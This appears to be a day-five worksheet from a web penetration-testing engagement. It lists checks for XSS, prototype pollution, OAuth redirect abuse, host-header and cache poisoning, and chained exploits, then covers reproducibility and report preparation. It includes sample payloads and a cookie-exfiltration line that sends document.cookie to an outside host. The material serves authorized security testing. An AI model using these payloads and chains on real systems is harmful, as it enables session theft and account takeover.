Client-Side Deep + Close Gaps

Today is about chains. Combine bugs, finish the surface map, verify everything reproduces from a fresh session, and prep the report shortlist. XSS → cookie steal → IDOR. SSRF → metadata → IAM → AWS account takeover.

0 / 0 tasks · 0% complete

1Open Items

Anything from Day 1's surface map you haven't actually tested yet?

2XSS (Reflected · Stored · DOM)

  • Reflected
  • Test every reflected canary site from Day 2 with full payloads (<svg/onload=alert(1)>)
  • Identify context: HTML body, attribute (single/double quote), JS string, JSON, URL
  • CSP bypass: script-src 'self' via JSONP, nonce reuse, unsafe-eval + AngularJS
  • Stored
  • Plant payloads in profile / comment / name / display fields, view as another user
  • Admin-viewing payloads: stored XSS that fires only when admin views user data → ATO
  • DOM
  • location.hash sources: #<img src=x onerror=alert(1)>
  • postMessage handlers: open another tab, send postMessage() from attacker page
  • Burp DOM Invader scan for sources/sinks (free, no Pro needed)
  • PoC
  • Cookie theft PoC — fetch('https://collab/?'+document.cookie)
  • Session-hijack PoC: steal cookie + impersonate from a separate browser

3Prototype Pollution

  • Find pollution sinks: Object.assign, lodash _.merge, jQuery.extend(true, ...), Object.create
  • Inject __proto__ via JSON: {"__proto__":{"polluted":true}} — check {}.polluted in console
  • Try constructor.prototype chain too
  • Identify a gadget: innerHTML, src, srcdoc, action, data, server-side template default
  • Server-side proto-pollution → RCE (Node.js apps, look for child_process.exec defaults)
  • Burp DOM Invader Prototype Pollution scan

4OAuth Chains

  • redirect_uri parser confusion: ?redirect_uri=//attacker.com, @attacker.com, #attacker.com
  • Account-takeover via state CSRF: drop state, link victim to attacker's auth code
  • Code interception: any open redirect on the redirect_uri host?
  • Implicit-flow token leak via Referer to a third-party resource on the post-auth page
  • Scope upgrade: ask for higher scopes than originally granted

5Host Header / Cache

  • Host-header poisoning on password-reset email link
  • Try X-Forwarded-Host, X-Original-Host, X-Forwarded-Server alternatives
  • Find unkeyed inputs: Param Miner / manual X-Forwarded-Scheme, X-Forwarded-Host, X-Original-URL
  • Confirm cacheable: Age: header, X-Cache: HIT, Cache-Control: public
  • Poison cache with XSS / open redirect via unkeyed header — affects all subsequent users
  • Cache deception: /profile/x.css — does it cache the dynamic profile response?

6Chained Findings

The whole point of Day 5 — combined impact > sum of parts. A 9.8-CVSS chain is one finding, not three.

  • Try XSS + CSRF chain (XSS triggers state-changing request)
  • Try SSRF + RCE chain (metadata IAM → S3 / Lambda / EC2 → RCE)
  • Try IDOR + role-escalation (modify another user's role to admin)
  • Try Prototype Pollution + gadget (PP makes a sink reachable)
  • Try Host-header + password-reset (poison link → ATO any user)

7Reproducibility Verification

Every finding must be reproducible from a clean state, otherwise it doesn't ship.

  • Fresh browser profile (or incognito) — clear cookies, localStorage, cache
  • Re-run every Day-4 POC from scratch — does it still fire?
  • Re-run every Day-5 chain end-to-end
  • Edge cases tested: different browsers, different roles, different tenants
  • Fresh screenshots captured for the report

8Final Report Shortlist

✓End of Day & Engagement

  • Every finding reproducible from a fresh session
  • Chained findings written as single tickets with the full attack narrative
  • Clean up: any payloads planted during testing removed (deleted XSS in profile, etc.)
  • Export all 5 day worksheets as text and archive with the engagement notes
  • Final report draft started — exec summary + findings table
  • Iron Rule: chains are written as one finding, not three; impact statement reflects the WORST credible outcome
